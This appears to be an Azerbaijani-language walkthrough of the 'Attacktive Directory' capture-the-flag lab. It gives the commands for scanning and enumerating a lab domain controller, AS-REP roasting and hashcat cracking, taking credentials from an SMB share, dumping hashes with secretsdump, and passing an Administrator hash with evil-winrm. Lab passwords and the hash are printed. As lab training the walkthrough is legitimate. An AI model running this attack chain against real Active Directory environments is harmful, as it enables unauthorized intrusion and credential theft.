# Attacktive Directory CTF

Nmap, cihazda hansı portların açıq olduğunu, hansı xidmətlərin işlədiyini aşkar etmək və hətta hansı əməliyyat sisteminin işlədiyini aşkar etmək üçün illər ərzində təkmilləşdirilmiş nisbətən mürəkkəb bir yardım proqramıdır.

```bash
sudo nmap -sV 10.10.56.170 -T4 -vv
```
![image alt]()

* Əvvəlcə Impacket Github repo-nu qutunuza klonlamalı olacaqsınız. Aşağıdakı komanda Impacket-i `/opt/impacket-ə` klonlayacaq:
```bash

git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install

```
* Hələ də problem yaşayırsınızsa, aşağıdakı skripti sınaqdan keçirə və bunun işlədiyini yoxlaya bilərsiniz:
```bash
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install
```
# Bloodhound və Neo4j quraşdırılması

Bloodhound, Attacktive Directory-ə hücum edərkən istifadə edəcəyimiz başqa bir vasitədir. Alətin xüsusiyyətlərini daha sonra nəzərdən keçirəcəyik, lakin hələlik Apt ilə iki paket quraşdırmalıyıq, bunlar `bloundhound` və `neo4j`. Onu aşağıdakı əmrlə quraşdıra bilərsiniz:

* link: https://www.kali.org/tools/bloodhound/

- Problemlərin aradan qaldırılması (**Troubleshooting**)

Bloodhound və Neo4j quraşdırmaqda probleminiz varsa, aşağıdakı əmri verməyə cəhd edin:
```bash
sudo apt update && apt upgrade
sudo neo4j console

#Yükləmək istədikdə , hər hansı bir problem olsa, onda bu linkə keçid edin:
link: https://www.kali.org/tools/bloodhound/
```
![image alt]()

#  Evil-WinRM :
`https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm#using-evil-winrm`

Note : **Evil-WinRM** Windows serverlərinə və iş stansiyalarına **Windows Remote Management (WinRM)** vasitəsilə qoşulmaq üçün istifadə olunan bir alətdir.

```bash
sudo apt install evil-winrm

link : https://www.kali.org/tools/evil-winrm/
```

# Enum4linux:
Enum4linux Windows sistemlərində informasiya toplamaq üçün istifadə olunan bir Linux alətidir. Əsas məqsədi Windows sistemləri haqqında mümkün qədər çox məlumat əldə etməkdir, xüsusilə də Active Directory və ya şəbəkə sınaqları zamanı.

```bash
 enum4linux -a 10.10.56.170 
```
NetBIOS və SMB (Server Message Block) protokolu vasitəsilə məlumat toplamaq:
(139/445)
Sistem adları, domen adları və iş qrupları haqqında məlumat.
Paylaşılan resursların siyahısını çıxarmaq (shared folders).
Aktiv istifadəçilər və qruplar haqqında məlumat.

![image alt]()

```bash
# nmap scan vasitəsilə default skriptləri yoxladıq
sudo nmap -sCV  10.10.56.170 -T4 -vv  
```
![image alt]()

# Kerberos
- Kerberos Active Directory daxilində əsas autentifikasiya xidmətidir. Bu portun açıq olması ilə istifadəçiləri, parolları və hətta parol spreyini kobud güclə tapmaq üçün `Kerbrute` adlı alətdən  istifadə edə bilərik!
1. Kerbrute yuklemek ucun: https://github.com/ropnop/kerbrute/releases
2. Parollar üçün wordlists: https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
3. İstifadəçilər üçün wordlists : https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

```bash
kerbrute userenum --dc 10.10.56.170 -d spookysec.local userlist.txt
```

![image alt]()

**ASREProasting** adlı hücum metodu ilə **Kerberos** sistemindəki bir zəiflikdən sui-istifadə etmək mümkündür. Bu hücum, istifadəçi hesabının **"Ön Doğrulama Tələb Etmir"** (Pre-Authentication Not Required) imtiyazına malik olduğu hallarda baş verir.

Bu nə deməkdir?

- Belə hesablar **Kerberos Bileti (TGT - Ticket Granting Ticket)** tələb etməzdən əvvəl hər hansı bir identifikasiya (məsələn, düzgün parol və ya hər hansı digər təsdiq mexanizmi) təqdim etməyə ehtiyac duymur.
- Bu, hücumçuya həmin hesabın **encrypted bileti**ni əldə edib **offline brute-force hücumu** vasitəsilə parolu açmağa imkan verir.

Bu üsul, xüsusilə zəif və düzgün konfiqurasiya olunmamış Kerberos sistemlərini hədəfləmək üçün istifadə edilir.

_________________________________________________________________________________________________________________________
**Kerbrute** alətindən istifadə edərək sistemdə mövcud olan istifadəçi adlarını müəyyən edib onları bir faylda saxlamışam. Daha sonra isə **Impacket**-in `GetNPUsers.py` skriptindən istifadə edərək, parolsuz **AS-REP Roasting** hücumunu həyata keçirirəm.

Bu proses mənə, hansı istifadəçilərin **Kerberos biletlərini (TGT)** parol təqdim etmədən əldə edə biləcəyimi öyrənməyə imkan verir. Əsas məqsəd, "Ön Doğrulama Tələb Etmir" imtiyazına malik olan hesabları aşkarlamaqdır. Bu cür zəifliklər, düzgün konfiqurasiya olunmamış Active Directory mühitlərində istifadə edilə bilər.

```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.56.170 spookysec.local/ -no-pass -usersfile
enum-useers
```

# Ümumi hash növləri
link: https://hashcat.net/wiki/doku.php?id=example_hashes

```bash
#GetNPUsers.py ilə əldə etdiyimiz hash yeni bir fayla yazırıq,
#ve onu hashcat ilə crack etməyə çalışacağıq.

hashcat -m 18200 yeni-hash passwordlist.txt 

nəticə : management2005
```
# SMBClient
SMBClient — SMB (Server Message Block) protokolunu istifadə edərək, şəbəkə üzərindən fayl paylaşımı, çap xidmətləri və digər şəbəkə resurslarına daxil olmaq üçün istifadə olunan bir alətdir

```bash
smbclient -L //10.10.143.217/  -U svc-admin
smbclient  //10.10.143.217/backup -U svc-admin
get backup_credentials.txt


#Bu komanda, base64 ilə kodlaşdırılmış mətni deşifrə edir.
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

![image alt]()
![image alt]()
![image alt]()
![image alt]()

# Credential Dumping: Secretsdump aləti ilə Active Directory-dən istifadəçi məlumatlarını ələ keçirdim.
```bash
secretsdump.py 'spookysec.local/svc-admin:management2005@10.10.143.217'
```
![image alt]()

```bash
secretsdump.py 'spookysec.local/backup:backup2517860@10.10.143.217' 
```
![image alt]()

# Pass the hash with evil-winrm

```bash
evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.50.82
```
![image alt]()
![image alt]()
![image alt]()
![image alt]()
![image alt]()